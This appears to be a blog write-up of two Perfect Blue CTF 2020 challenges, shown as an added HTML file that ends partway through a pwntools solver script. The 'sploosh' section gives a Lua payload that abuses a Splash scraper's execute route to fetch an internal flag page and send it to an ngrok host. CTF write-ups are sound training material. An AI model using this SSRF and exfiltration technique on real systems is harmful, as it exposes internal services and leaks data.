@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+
+    <title>Perfect Blue CTF 2020</title>
+    <meta name="description" content="">
+
+    <link rel="stylesheet" href="https://tsheinen.github.io/main.css">
+    
+    
+
+    <style>
+        
+        [data-theme="Dark"] {   
+            --background-color: #2D283E;
+            --background-alt-color: #36304B;
+            --highlight-color: #DEC1FF;
+            --highlight-color-alt: #ED254E;
+            --foreground-color: #D1D7E0;
+        }
+        
+        [data-theme="Light"] {   
+            --background-color: #E0F5CC;
+            --background-alt-color: #EAF8DD;
+            --highlight-color: #D8315B;
+            --highlight-color-alt: #0197F6;
+            --foreground-color: #3B413C;
+        }
+        
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.4.0/dist/confetti.browser.min.js"></script>
+    
+    
+</head>
+<body data-theme="dark">
+    <script defer>
+
+        function setTheme(theme) {
+            document.body.dataset['theme'] = theme;
+            localStorage.setItem('theme', theme);
+        }
+        window.addEventListener('storage', function(event){
+            if (event.storageArea === localStorage && event.key === "theme") {
+                setTheme(event.newValue);
+            }
+        }, false);
+        setTheme(localStorage.getItem('theme') || 'dark');
+        setTimeout(() => window.document.body.classList.add("transition"), 300);
+    </script>
+    <a class="skip-main" href="#main">Skip to content</a>
+    <div class="container">
+        <header> 
+            <h1 class="site-header">
+                <a href="https:&#x2F;&#x2F;tsheinen.github.io">Teddy Heinen</a>
+            </h1>
+            <nav>
+                
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;about&#x2F;">About</a>
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;tags&#x2F;">Tags</a>
+                
+<!--                 <div class="search-container">
+                    <input id="search" type="search" placeholder="🧐 Search!">
+
+                    <div class="search-results">
+                        <div class="search-results__items"></div>
+                    </div>
+                </div> -->
+                
+            </nav>
+        </header>
+        <main id="main" tabindex="-1">
+            
+
+
+<nav class="toc">
+  <ul>
+  
+      <li>
+        <a href="https://tsheinen.github.io/pbctf-2020/#sploosh">sploosh</a>
+        <ul>
+          
+            <li>
+                <a href="https://tsheinen.github.io/pbctf-2020/#initial-review">initial review</a>
+            </li>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/pbctf-2020/#find-rbtree">find rbtree</a>
+        <ul>
+          
+            <li>
+                <a href="https://tsheinen.github.io/pbctf-2020/#initial-review-1">initial review</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/pbctf-2020/#attack">attack</a>
+            </li>
+          
+        </ul>
+      </li>
+  
+  </ul>
+  <svg class="toc-marker" width="200" height="200" xmlns="http://www.w3.org/2000/svg">
+    <path stroke="#444" stroke-width="3" fill="transparent" stroke-dasharray="0, 0, 0, 1000" stroke-linecap="round" stroke-linejoin="round" transform="translate(-0.5, -0.5)" />
+  </svg>
+</nav>
+
+<article class="post">
+    <header>
+        <h1>Perfect Blue CTF 2020</h1>
+    </header>
+
+    <div class="content">
+        <h1 id="sploosh">sploosh</h1>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>I wanted to make my own URL scraper, but parsing HTML is hard, so I used some random open source scraping project instead.
+</span><span>
+</span><span>http://sploosh.chal.perfect.blue/
+</span><span>
+</span><span>By: Corb3nik
+</span></code></pre>
+<h2 id="initial-review">initial review</h2>
+<p><img src="/ctf/pbctf-2020/sploosh_intro.png" alt="entry page to sploosh" /></p>
+<p>Nothing particularly interesting here -- it will scrape a website and tell you the viewport geometry.  We're provided source code so i'm not going to bother looking harder at this.</p>
+<h3 id="docker">docker</h3>
+<pre data-lang="yml" style="background-color:#212733;color:#ccc9c2;" class="language-yml "><code class="language-yml" data-lang="yml"><span style="color:#73d0ff;">version</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;3.8&quot;
+</span><span style="color:#73d0ff;">services</span><span style="color:#ccc9c2cc;">:
+</span><span>  </span><span style="color:#73d0ff;">webapp</span><span style="color:#ccc9c2cc;">:
+</span><span>    </span><span style="color:#73d0ff;">build</span><span style="color:#ccc9c2cc;">: .
+</span><span>    </span><span style="color:#73d0ff;">env_file</span><span style="color:#ccc9c2cc;">:
+</span><span>      - </span><span style="color:#bae67e;">./flag.env
+</span><span>    </span><span style="color:#73d0ff;">networks</span><span style="color:#ccc9c2cc;">:
+</span><span>      </span><span style="color:#73d0ff;">sploosh_internal</span><span style="color:#ccc9c2cc;">:
+</span><span>        </span><span style="color:#73d0ff;">ipv4_address</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">172</span><span style="color:#ccc9c2cc;">.</span><span style="color:#ffcc66;">16.0.14
+</span><span>
+</span><span>    </span><span style="color:#73d0ff;">ports</span><span style="color:#ccc9c2cc;">:
+</span><span>      - </span><span style="color:#bae67e;">9000:80
+</span><span>    </span><span style="color:#73d0ff;">volumes</span><span style="color:#ccc9c2cc;">:
+</span><span>      - </span><span style="color:#bae67e;">./src:/var/www/html/:ro
+</span><span>
+</span><span>  </span><span style="color:#73d0ff;">splash</span><span style="color:#ccc9c2cc;">:
+</span><span>    </span><span style="color:#73d0ff;">image</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">scrapinghub/splash
+</span><span>    </span><span style="color:#73d0ff;">networks</span><span style="color:#ccc9c2cc;">:
+</span><span>      </span><span style="color:#73d0ff;">sploosh_internal</span><span style="color:#ccc9c2cc;">:
+</span><span>        </span><span style="color:#73d0ff;">ipv4_address</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">172</span><span style="color:#ccc9c2cc;">.</span><span style="color:#ffcc66;">16.0.13
+</span><span>
+</span><span style="color:#73d0ff;">networks</span><span style="color:#ccc9c2cc;">:
+</span><span>  </span><span style="color:#73d0ff;">sploosh_internal</span><span style="color:#ccc9c2cc;">:
+</span><span>    </span><span style="color:#73d0ff;">ipam</span><span style="color:#ccc9c2cc;">:
+</span><span>      </span><span style="color:#73d0ff;">driver</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">default
+</span><span>      </span><span style="color:#73d0ff;">config</span><span style="color:#ccc9c2cc;">:
+</span><span>        - </span><span style="color:#73d0ff;">subnet</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">172.16.0.0/24
+</span></code></pre>
+<p>So we have a generally accessible wrapper around some public repository "splash" which seems likely to be a scraping tool of some sort.</p>
+<h3 id="flag-php">flag.php</h3>
+<pre data-lang="php" style="background-color:#212733;color:#ccc9c2;" class="language-php "><code class="language-php" data-lang="php"><span>&lt;?php
+</span><span>
+</span><span>$FLAG </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">getenv</span><span>(</span><span style="color:#bae67e;">&quot;FLAG&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>
+</span><span>$remote_ip </span><span style="color:#f29e74;">= </span><span>$_SERVER[</span><span style="color:#bae67e;">&#39;REMOTE_ADDR&#39;</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">if </span><span>($remote_ip </span><span style="color:#f29e74;">=== </span><span style="color:#bae67e;">&quot;172.16.0.13&quot; </span><span style="color:#f29e74;">|| </span><span>$remote_ip </span><span style="color:#f29e74;">=== </span><span style="color:#bae67e;">&#39;172.16.0.14&#39;</span><span>) {
+</span><span>  </span><span style="color:#f28779;">echo </span><span>$FLAG</span><span style="color:#ccc9c2cc;">;
+</span><span>} </span><span style="color:#ffa759;">else </span><span>{
+</span><span>  </span><span style="color:#f28779;">echo </span><span style="color:#bae67e;">&quot;No flag for you :)&quot;</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span><span>?&gt;
+</span></code></pre>
+<p>ok so its an <a href="https://portswigger.net/web-security/ssrf">SSRF</a>.  Nice to have confirmation lol.  We get the flag if the source address is either one of the docker containers.  Unfortunately our scrapping access point only tells us the viewport geometry (which will be constant for all web pages because its essentially just the emulated screen size of webkit) so we don't have much to work with here.</p>
+<h3 id="api-php">api.php</h3>
+<pre data-lang="php" style="background-color:#212733;color:#ccc9c2;" class="language-php "><code class="language-php" data-lang="php"><span>&lt;?php
+</span><span style="color:#f28779;">error_reporting</span><span>(</span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>
+</span><span style="color:#f28779;">header</span><span>(</span><span style="color:#bae67e;">&quot;Content-Type: application/json&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>
+</span><span style="color:#ffa759;">function </span><span style="color:#ffd580;">fail</span><span>() {
+</span><span>  </span><span style="color:#f28779;">echo </span><span style="color:#bae67e;">&quot;{}&quot;</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">die</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span><span>
+</span><span style="color:#ffa759;">if </span><span>(</span><span style="color:#f29e74;">!</span><span style="color:#f28779;">isset</span><span>($_GET[</span><span style="color:#bae67e;">&#39;url&#39;</span><span>])) {
+</span><span>  </span><span style="color:#ffd580;">fail</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span><span>
+</span><span>
+</span><span>$url </span><span style="color:#f29e74;">= </span><span>$_GET[</span><span style="color:#bae67e;">&#39;url&#39;</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>
+</span><span style="color:#ffa759;">if </span><span>($url </span><span style="color:#f29e74;">=== </span><span style="color:#bae67e;">&#39;&#39;</span><span>) {
+</span><span>  </span><span style="color:#ffd580;">fail</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span><span>
+</span><span style="color:#ffa759;">try </span><span>{
+</span><span>  $json </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">file_get_contents</span><span>(</span><span style="color:#bae67e;">&quot;http://splash:8050/render.json?timeout=1&amp;url=&quot; </span><span style="color:#f29e74;">. </span><span style="color:#f28779;">urlencode</span><span>($url))</span><span style="color:#ccc9c2cc;">;
+</span><span>  $out </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">array</span><span>(</span><span style="color:#bae67e;">&quot;geometry&quot; </span><span style="color:#f29e74;">=&gt; </span><span style="color:#f28779;">json_decode</span><span>($json)</span><span style="color:#f29e74;">-&gt;</span><span>geometry)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#f28779;">echo json_encode</span><span>($out)</span><span style="color:#ccc9c2cc;">;
+</span><span>} </span><span style="color:#ffa759;">catch</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">Exception </span><span>$e) {
+</span><span>  </span><span style="color:#ffd580;">fail</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span><span>?&gt;
+</span></code></pre>
+<p>Well this is interesting!  Although it didn't end up panning out solution-wise, you can pollute parameters for /render.json.  I spend an awfully large amount of time trying to use the js_source parameter (which executes arbitrary JS in the context of the scraped page) to make a network request.</p>
+<h3 id="what-can-scrapinghub-splash-do">what can scrapinghub/splash do?</h3>
+<p>There doesn't seem to be anything useful for flag gathering in sploosh, so lets take a look at the scraping API it calls!  <code>/render.json</code> has a number of parameters we can set if we wish (show html, show png, execute arbitrary js in the context of the page) but the issue is we only ever see the geometry of the page.  My first thought was that you could use JS to change the geometry of the page and then essentially binary search your way through the flag.  That didn't work out because you can't (easily) make external http requests or change the geometry size.</p>
+<p>What else can Splash do?  Well it can render it as html, png, jpeg, etc.  It also has an execute route which uh executes a Lua script to handle more obscure scraping use cases.  The script is passed in through a GET query parameter which means that we can make this request from Sploosh!  Executing code from this context can obviously make network requests (because it has to for scraping) so very likely this will get us the flag.</p>
+<p>A few minutes later we have a payload and just need to url encode it and pass it to Sploosh.  Probably could've made it return the flag in geometry but I already had ngrok running for my js_source try so that happened first lol.</p>
+<pre data-lang="lua" style="background-color:#212733;color:#ccc9c2;" class="language-lua "><code class="language-lua" data-lang="lua"><span>http</span><span style="color:#f29e74;">://</span><span>splash</span><span style="color:#f29e74;">:</span><span style="color:#ffcc66;">8050</span><span style="color:#f29e74;">/</span><span>execute?</span><span style="color:#ffd580;">lua_source</span><span style="color:#f29e74;">=</span><span style="color:#ffa759;">function </span><span style="color:#ffd580;">main</span><span>(</span><span style="color:#ffcc66;">splash</span><span>)
+</span><span>    treat </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">require</span><span>(</span><span style="color:#bae67e;">&quot;treat&quot;</span><span>)
+</span><span>    i, j </span><span style="color:#f29e74;">= </span><span>treat</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">as_string</span><span>(splash</span><span style="color:#f29e74;">:</span><span style="color:#ffd580;">http_get</span><span>(</span><span style="color:#bae67e;">&quot;http://172.16.0.14/flag.php&quot;</span><span>)</span><span style="color:#f29e74;">.</span><span>body)
+</span><span>    </span><span style="color:#ffa759;">local </span><span>dest </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;http://801a64a6dc80.ngrok.io/&quot; </span><span style="color:#f29e74;">.. </span><span>i
+</span><span>    splash</span><span style="color:#f29e74;">:</span><span style="color:#ffd580;">http_get</span><span>(dest)
+</span><span>    </span><span style="color:#ffa759;">return </span><span style="color:#bae67e;">&#39;hello&#39;
+</span><span style="color:#ffa759;">end
+</span></code></pre>
+<p>flag: pbctf{1_h0p3_y0u_us3d_lua_f0r_th1s}</p>
+<h1 id="find-rbtree">find rbtree</h1>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>Find rbtree among hundreds of people
+</span><span>
+</span><span>nc find-rbtree.chal.perfect.blue 1
+</span><span>
+</span><span>Update: The challenge.py was updated at 01:00 UTC, 6th Dec. Please redownload if you have downloaded prior to that.
+</span><span>
+</span><span>By: sampriti &amp; rbtree
+</span></code></pre>
+<p><a href="/ctf/pbctf-2020/find_rbtree.py">find_rbtree.py</a></p>
+<h2 id="initial-review-1">initial review</h2>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">def </span><span style="color:#ffd580;">stage</span><span>(</span><span style="color:#ffcc66;">num_stage</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">num_people</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">num_ask</span><span>):
+</span><span>    </span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;STAGE </span><span style="color:#ffcc66;">{}</span><span style="color:#bae67e;"> / 30&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">format</span><span>(num_stage))
+</span><span>    </span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;Generating people... (and rbtree)&quot;</span><span>)
+</span><span>
+</span><span>    people </span><span style="color:#f29e74;">= </span><span style="font-style:italic;color:#5ccfe6;">list</span><span>(itertools</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">product</span><span>(</span><span style="color:#f29e74;">*</span><span>prop</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">values</span><span>()))
+</span><span>    random</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">shuffle</span><span>(people)
+</span><span>    people </span><span style="color:#f29e74;">= </span><span>people[</span><span style="color:#ccc9c2cc;">:</span><span>num_people]
+</span><span>    rbtree </span><span style="color:#f29e74;">= </span><span>random</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">choice</span><span>(people)
+</span><span>    </span><span style="color:#f28779;">print</span><span>(rbtree)
+</span><span>    </span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;=&quot; </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">29</span><span>)
+</span><span>    </span><span style="color:#ffa759;">for </span><span>idx</span><span style="color:#ccc9c2cc;">, </span><span>person </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">enumerate</span><span>(people):
+</span><span>        </span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot; &quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">join</span><span>(</span><span style="color:#bae67e;">&quot; [PERSON </span><span style="color:#ffcc66;">{:4d}</span><span style="color:#bae67e;">] &quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">format</span><span>(idx </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span>)))
+</span><span>        </span><span style="color:#ffa759;">for </span><span>prop_name</span><span style="color:#ccc9c2cc;">, </span><span>prop_val </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">zip</span><span>(prop</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">keys</span><span>()</span><span style="color:#ccc9c2cc;">, </span><span>person):
+</span><span>            </span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#ffcc66;">{:14s}</span><span style="color:#bae67e;">: </span><span style="color:#ffcc66;">{}</span><span style="color:#bae67e;">&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">format</span><span>(prop_name</span><span style="color:#ccc9c2cc;">, </span><span>prop_val))
+</span><span>        </span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;=&quot; </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">29</span><span>)
+</span><span>
+</span><span>    </span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;Now ask me!&quot;</span><span>)
+</span><span>
+</span><span>    </span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(num_ask):
+</span><span>        prop_name </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">input</span><span>(</span><span style="color:#bae67e;">&quot;? &gt; &quot;</span><span>)
+</span><span>        </span><span style="color:#ffa759;">if </span><span>prop_name </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&#39;Solution&#39;</span><span>:
+</span><span>            </span><span style="color:#ffa759;">break
+</span><span>        </span><span style="color:#ffa759;">if </span><span>prop_name </span><span style="color:#f29e74;">not in </span><span>prop:
+</span><span>            </span><span style="color:#ffa759;">return </span><span style="color:#ffcc66;">False
+</span><span>        
+</span><span>        prop_ask </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">input</span><span>(</span><span style="color:#bae67e;">&quot;! &gt; &quot;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">strip</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">split</span><span>(</span><span style="color:#bae67e;">&#39; &#39;</span><span>)
+</span><span>        </span><span style="color:#ffa759;">for </span><span>val </span><span style="color:#ffa759;">in </span><span>prop_ask:
+</span><span>            </span><span style="color:#ffa759;">if </span><span>val </span><span style="color:#f29e74;">not in </span><span>prop[prop_name]:
+</span><span>                </span><span style="color:#ffa759;">return </span><span style="color:#ffcc66;">False
+</span><span>
+</span><span>        </span><span style="color:#ffa759;">if </span><span style="font-style:italic;color:#5ccfe6;">set</span><span>(rbtree) </span><span style="color:#f29e74;">&amp; </span><span style="font-style:italic;color:#5ccfe6;">set</span><span>(prop_ask):
+</span><span>            </span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;YES&quot;</span><span>)
+</span><span>        </span><span style="color:#ffa759;">else</span><span>:
+</span><span>            </span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;NO&quot;</span><span>)
+</span><span>
+</span><span>    rbtree_guess </span><span style="color:#f29e74;">= </span><span style="font-style:italic;color:#5ccfe6;">tuple</span><span>(</span><span style="color:#f28779;">input</span><span>(</span><span style="color:#bae67e;">&quot;rbtree &gt; &quot;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">strip</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">split</span><span>(</span><span style="color:#bae67e;">&#39; &#39;</span><span>))
+</span><span>    </span><span style="color:#f28779;">print</span><span>(rbtree_guess)
+</span><span>    </span><span style="color:#f28779;">print</span><span>(rbtree)
+</span><span>    </span><span style="color:#ffa759;">if </span><span>rbtree </span><span style="color:#f29e74;">== </span><span>rbtree_guess:
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffcc66;">True
+</span><span>    </span><span style="color:#ffa759;">else</span><span>:
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffcc66;">False
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span>():
+</span><span>    </span><span style="color:#f28779;">print</span><span>(welcome)
+</span><span>
+</span><span>    cases </span><span style="color:#f29e74;">= </span><span>[(</span><span style="color:#ffcc66;">5</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">3</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">7</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">3</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">10</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">4</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">15</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">4</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">20</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">5</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">25</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">5</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">50</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">6</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">75</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">7</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">100</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">8</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#ffcc66;">250</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">9</span><span>)]
+</span><span>    cases </span><span style="color:#f29e74;">+= </span><span>[(</span><span style="color:#ffcc66;">400</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">10</span><span>)] </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">5 </span><span style="color:#f29e74;">+ </span><span>[(</span><span style="color:#ffcc66;">750</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">11</span><span>)] </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">5 </span><span style="color:#f29e74;">+ </span><span>[(</span><span style="color:#ffcc66;">1000</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">12</span><span>)] </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">5 </span><span style="color:#f29e74;">+ </span><span>[(</span><span style="color:#ffcc66;">1600</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">12</span><span>)] </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">5
+</span><span>
+</span><span>    </span><span style="color:#ffa759;">for </span><span>idx</span><span style="color:#ccc9c2cc;">, </span><span>(num_people</span><span style="color:#ccc9c2cc;">, </span><span>num_ask) </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">enumerate</span><span>(cases):
+</span><span>        </span><span style="color:#ffa759;">if </span><span style="color:#f29e74;">not </span><span style="color:#ffd580;">stage</span><span>(idx </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">, </span><span>num_people</span><span style="color:#ccc9c2cc;">, </span><span>num_ask):
+</span><span>            </span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;WRONG :(&quot;</span><span>)
+</span><span>            </span><span style="color:#ffa759;">return
+</span><span>        </span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;You found rbtree!&quot;</span><span>)
+</span><span>
+</span><span>    </span><span style="color:#ffa759;">with </span><span style="color:#f28779;">open</span><span>(</span><span style="color:#bae67e;">&quot;flag.txt&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;r&quot;</span><span>) </span><span style="color:#ffa759;">as </span><span>f:
+</span><span>        </span><span style="color:#f28779;">print</span><span>(f</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">read</span><span>())
+</span></code></pre>
+<p>It will display a (varying with round number) number of randomly generated people and select one of them to be rbtree.  To pass that round (there are 30 rounds total) you need to correctly guess every item of clothing rbtree is wearing.  To assist us, we may ask if rbtree is wearing a specific item of clothing a few times before we try and guess.</p>
+<h2 id="attack">attack</h2>
+<p>The first thing I noticed when I looked at the cases list was that the number of times we can ask a question is just slightly over log2(num_people).  If we can filter out half the list with every question then when we run out of questions we will have only a single person left who must be rbtree.  The list of people is randomly generated so we won't always be able to narrow it down to a single person, but its fairly trivial to just try again if we fail since it shouldn't happen often enough to make it intractable.  I uh also threaded it because i was bored and could.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span style="color:#ffa759;">import </span><span>re
+</span><span style="color:#ffa759;">from </span><span>collections </span><span style="color:#ffa759;">import </span><span>defaultdict
+</span><span style="color:#ffa759;">import </span><span>pprint
+</span><span style="color:#ffa759;">from </span><span>flatten_dict </span><span style="color:#ffa759;">import </span><span>flatten
+</span><span style="color:#ffa759;">import </span><span>json
+</span><span style="color:#ffa759;">import </span><span>sys
+</span><span style="color:#ffa759;">import </span><span>random
+</span><span style="color:#ffa759;">import </span><span>threading
+</span><span>pp </span><span style="color:#f29e74;">= </span><span>pprint</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">PrettyPrinter</span><span>(</span><span style="color:#ffcc66;">indent</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">4</span><span>)
+</span><span>
+</span><span>prop </span><span style="color:#f29e74;">= </span><span>{
+</span><span>    </span><span style="color:#bae67e;">&quot;Eyewear&quot;</span><span style="color:#ccc9c2cc;">: </span><span>[</span><span style="color:#bae67e;">&quot;Glasses&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;Monocle&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;None&quot;</span><span>]</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;Eye color&quot;</span><span style="color:#ccc9c2cc;">: </span><span>[</span><span style="color:#bae67e;">&quot;Brown&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;Blue&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;Hazel&quot;</span><span>]</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;Hair&quot;</span><span style="color:#ccc9c2cc;">: </span><span>[</span><span style="color:#bae67e;">&quot;Straight&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;Curly&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;Bald&quot;</span><span>]</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;Outerwear&quot;</span><span style="color:#ccc9c2cc;">: </span><span>[</span><span style="color:#bae67e;">&quot;Coat&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;Hoodie&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;Poncho&quot;</span><span>]</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;T-shirt color&quot;</span><span style="color:#ccc9c2cc;">: </span><span>[</span><span style="color:#bae67e;">&quot;Red&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;Orange&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;Green&quot;</span><span>]</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;Trousers&quot;</span><span style="color:#ccc9c2cc;">: </span><span>[</span><span style="color:#bae67e;">&quot;Jeans&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;Leggings&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;Sweatpants&quot;</span><span>]</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;Socks color&quot;</span><span style="color:#ccc9c2cc;">: </span><span>[</span><span style="color:#bae67e;">&quot;Black&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;Gray&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;White&quot;</span><span>]</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;Shoes&quot;</span><span style="color:#ccc9c2cc;">: </span><span>[</span><span style="color:#bae67e;">&quot;Boots&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;Slippers&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;Sneakers&quot;</span><span>]</span><span style="color:#ccc9c2cc;">,
+</span><span>}
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">conn</span><span>():
